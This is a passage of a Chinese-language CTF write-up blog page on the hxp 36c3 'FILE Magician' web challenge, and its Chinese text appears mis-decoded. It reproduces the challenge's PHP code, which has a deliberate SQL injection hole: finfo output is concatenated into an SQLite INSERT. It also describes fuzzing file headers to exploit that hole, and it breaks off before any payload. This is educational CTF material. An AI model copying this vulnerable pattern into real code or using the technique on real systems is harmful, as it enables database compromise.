<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="å‰è¨€hxp 363c ctfçš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå¥½çš„å› æ­¤æ€»ç»“äº†ä¸€ä¸‹ã€‚ 0x01 FILE Magician12345678910111213Difficulty estimate: easySolved:133/321Points: round(1000 Â· min(1, 10 / (9 + [133 solves]))) = 70 pointsDescription:Finally (again),">
<meta property="og:type" content="article">
<meta property="og:title" content="hxp 36c3 ctf Web å­¦ä¹ è®°å½•">
<meta property="og:url" content="http://yoursite.com/2020/01/15/hxp-36c3-ctf-Web-å­¦ä¹ è®°å½•/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="å‰è¨€hxp 363c ctfçš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå¥½çš„å› æ­¤æ€»ç»“äº†ä¸€ä¸‹ã€‚ 0x01 FILE Magician12345678910111213Difficulty estimate: easySolved:133/321Points: round(1000 Â· min(1, 10 / (9 + [133 solves]))) = 70 pointsDescription:Finally (again),">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-10.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-11.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-12.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-2.png">
<meta property="og:updated_time" content="2020-01-15T03:35:12.328Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hxp 36c3 ctf Web å­¦ä¹ è®°å½•">
<meta name="twitter:description" content="å‰è¨€hxp 363c ctfçš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå¥½çš„å› æ­¤æ€»ç»“äº†ä¸€ä¸‹ã€‚ 0x01 FILE Magician12345678910111213Difficulty estimate: easySolved:133/321Points: round(1000 Â· min(1, 10 / (9 + [133 solves]))) = 70 pointsDescription:Finally (again),">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-3.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/01/15/hxp-36c3-ctf-Web-å­¦ä¹ è®°å½•/">





  <title>hxp 36c3 ctf Web å­¦ä¹ è®°å½• | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/hxp-36c3-ctf-Web-å­¦ä¹ è®°å½•/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">hxp 36c3 ctf Web å­¦ä¹ è®°å½•</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-15T11:33:52+08:00">
                2020-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php-web/" itemprop="url" rel="index">
                    <span itemprop="name">php-web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  6.3k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  28
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>hxp 363c ctfçš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå¥½çš„å› æ­¤æ€»ç»“äº†ä¸€ä¸‹ã€‚</p>
<h5 id="0x01-FILE-Magician"><a href="#0x01-FILE-Magician" class="headerlink" title="0x01 FILE Magician"></a>0x01 FILE Magician</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Difficulty estimate: easy</span><br><span class="line"></span><br><span class="line">Solved:133/321</span><br><span class="line"></span><br><span class="line">Points: round(1000 Â· min(1, 10 / (9 + [133 solves]))) = 70 points</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Finally (again), a minimalistic, open-source file hosting solution.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz</span><br></pre></td></tr></table></figure>

<h6 id="è¿™é“é¢˜ä¸å…¶ä»–ä¸¤é“ç›¸æ¯”ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªäº†ï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºDockeræ–‡ä»¶æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹ï¼š"><a href="#è¿™é“é¢˜ä¸å…¶ä»–ä¸¤é“ç›¸æ¯”ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªäº†ï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºDockeræ–‡ä»¶æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹ï¼š" class="headerlink" title="è¿™é“é¢˜ä¸å…¶ä»–ä¸¤é“ç›¸æ¯”ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªäº†ï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºDockeræ–‡ä»¶æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹ï¼š"></a>è¿™é“é¢˜ä¸å…¶ä»–ä¸¤é“ç›¸æ¯”ç®—æ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ªäº†ï¼Œé¢˜ç›®ç›´æ¥ç»™å‡ºDockeræ–‡ä»¶æºä»£ç ï¼Œæºä»£ç å¦‚ä¸‹ï¼š</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_startup_errors'</span>, <span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ! <span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = bin2hex(random_bytes(<span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="string">'/var/www/html/files/'</span>.$_SESSION[<span class="string">'id'</span>] . <span class="string">'/'</span>;</span><br><span class="line">@mkdir($d, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">chdir($d) || <span class="keyword">die</span>(<span class="string">'chdir'</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:'</span> . $d . <span class="string">'db.sqlite3'</span>);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;exec(<span class="string">'CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]) &amp;&amp; $_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &lt; <span class="number">10</span>*<span class="number">1024</span> )&#123;</span><br><span class="line">    $s = <span class="string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="keyword">new</span> finfo)-&gt;file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]). <span class="string">" ');"</span>;</span><br><span class="line">    $db-&gt;exec($s);</span><br><span class="line">    move_uploaded_file( $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="keyword">die</span>(<span class="string">'move_upload_file'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uploads = [];</span><br><span class="line">$sql = <span class="string">'SELECT * FROM upload'</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($db-&gt;query($sql) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">    $uploads[] = [$row[<span class="string">'id'</span>], $row[<span class="string">'info'</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;file magician&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"upload"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($uploads <span class="keyword">as</span> $upload):<span class="meta">?&gt;</span></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=<span class="string">"&lt;?= '/files/' . $_SESSION['id'] . '/' . $upload[0] ?&gt;"</span>&gt;<span class="meta">&lt;?</span>= $upload[<span class="number">0</span>] <span class="meta">?&gt;</span>&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?</span>= $upload[<span class="number">1</span>] <span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endforeach</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h6 id="é¢˜ç›®çš„åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„sandboxå½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±-new-finfo-gt-fileæ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº†sqliteè¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚"><a href="#é¢˜ç›®çš„åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„sandboxå½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±-new-finfo-gt-fileæ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº†sqliteè¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚" class="headerlink" title="é¢˜ç›®çš„åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„sandboxå½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±(new finfo)-&gt;fileæ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº†sqliteè¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚"></a>é¢˜ç›®çš„åŠŸèƒ½ç‚¹å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååœ¨è‡ªå·±çš„sandboxå½“ä¸­çœ‹åˆ°è‡ªå·±çš„æ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ç”±<code>(new finfo)-&gt;file</code>æ¥åˆ¤æ–­çš„ï¼Œè¿˜ä½¿ç”¨äº†sqliteè¿›è¡Œå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„è®°å½•ã€‚</h6><h6 id="ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº†idä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸ºä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†lastInsertId-è¿”å›æœ€åä¸€æ¬¡insertæ•°æ®çš„idä½œä¸ºæ–‡ä»¶å"><a href="#ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº†idä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸ºä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†lastInsertId-è¿”å›æœ€åä¸€æ¬¡insertæ•°æ®çš„idä½œä¸ºæ–‡ä»¶å" class="headerlink" title="ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº†idä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸ºä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†lastInsertId()è¿”å›æœ€åä¸€æ¬¡insertæ•°æ®çš„idä½œä¸ºæ–‡ä»¶å"></a>ç”±äºåˆ›å»ºçš„æ•°æ®åº“è§„å®šäº†idä¸ºè‡ªå¢é•¿çš„æ•´å‹ä¸ºä¸»é”®ï¼Œè€Œä¸”å®ƒä½¿ç”¨äº†<code>lastInsertId()</code>è¿”å›æœ€åä¸€æ¬¡insertæ•°æ®çš„idä½œä¸ºæ–‡ä»¶å</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">move_uploaded_file( $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $d . $db-&gt;lastInsertId()) || <span class="keyword">die</span>(<span class="string">'move_upload_file'</span>);</span><br></pre></td></tr></table></figure>

<h6 id="æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶getshelläº†ã€‚"><a href="#æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶getshelläº†ã€‚" class="headerlink" title="æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶getshelläº†ã€‚"></a>æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šå¯ä»¥ä¸ç”¨è€ƒè™‘æ˜¯å¦å­˜åœ¨é€šè¿‡å¯æ§æ–‡ä»¶åä¸Šä¼ æ–‡ä»¶getshelläº†ã€‚</h6><h6 id="çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº†sqlè¯­å¥å½“ä¸­"><a href="#çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº†sqlè¯­å¥å½“ä¸­" class="headerlink" title="çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº†sqlè¯­å¥å½“ä¸­"></a>çºµè§‚æ•´ä¸ªæ–‡ä»¶ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å¯æ§çš„è¾“å…¥ç‚¹ä¹Ÿåªæœ‰åœ¨æ–‡ä»¶ç±»å‹å½“ä¸­ï¼Œæ–‡ä»¶ç±»å‹åˆè¢«æ‹¼å…¥åˆ°äº†sqlè¯­å¥å½“ä¸­</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="string">"INSERT INTO upload(info) VALUES ('"</span> .(<span class="keyword">new</span> finfo)-&gt;file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]). <span class="string">" ');"</span>;</span><br></pre></td></tr></table></figure>

<h6 id="æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsqlæ³¨å…¥æ¥è¿›è¡Œä¸€æ³¢æ“ä½œäº†ã€‚"><a href="#æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsqlæ³¨å…¥æ¥è¿›è¡Œä¸€æ³¢æ“ä½œäº†ã€‚" class="headerlink" title="æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsqlæ³¨å…¥æ¥è¿›è¡Œä¸€æ³¢æ“ä½œäº†ã€‚"></a>æ‰€ä»¥æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œsqlæ³¨å…¥æ¥è¿›è¡Œä¸€æ³¢æ“ä½œäº†ã€‚</h6><h6 id="å‚è€ƒçš„æ€è·¯å°±æ˜¯fuzzä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨finfoå¾—å‡ºçš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¼€å§‹fuzzæ–‡ä»¶å¤´ï¼Œä»0x00åˆ°0xff0xffã€‚"><a href="#å‚è€ƒçš„æ€è·¯å°±æ˜¯fuzzä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨finfoå¾—å‡ºçš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¼€å§‹fuzzæ–‡ä»¶å¤´ï¼Œä»0x00åˆ°0xff0xffã€‚" class="headerlink" title="å‚è€ƒçš„æ€è·¯å°±æ˜¯fuzzä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨finfoå¾—å‡ºçš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¼€å§‹fuzzæ–‡ä»¶å¤´ï¼Œä»0x00åˆ°0xff0xffã€‚"></a>å‚è€ƒçš„æ€è·¯å°±æ˜¯fuzzä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸäº›æ–‡ä»¶ä½¿ç”¨<code>finfo</code>å¾—å‡ºçš„ç»“æœå«æœ‰å•å¼•å·ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜èƒ½å¤Ÿæ’å…¥å¯æ§æ•°æ®ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¼€å§‹fuzzæ–‡ä»¶å¤´ï¼Œä»<code>0x00</code>åˆ°<code>0xff0xff</code>ã€‚</h6><h6 id="ç»ˆäºåœ¨0x1f0x9då¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯compress-39-d-dataï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚"><a href="#ç»ˆäºåœ¨0x1f0x9då¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯compress-39-d-dataï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚" class="headerlink" title="ç»ˆäºåœ¨0x1f0x9då¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯compress&#39;d dataï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚"></a>ç»ˆäºåœ¨<code>0x1f0x9d</code>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ç±»å‹æ˜¯<code>compress&#39;d data</code>ï¼Œè™½ç„¶æœ‰å•å¼•å·ï¼Œä½†æ˜¯ä¸å­˜åœ¨æˆ‘ä»¬å¯æ§çš„æ•°æ®ã€‚</h6><h6 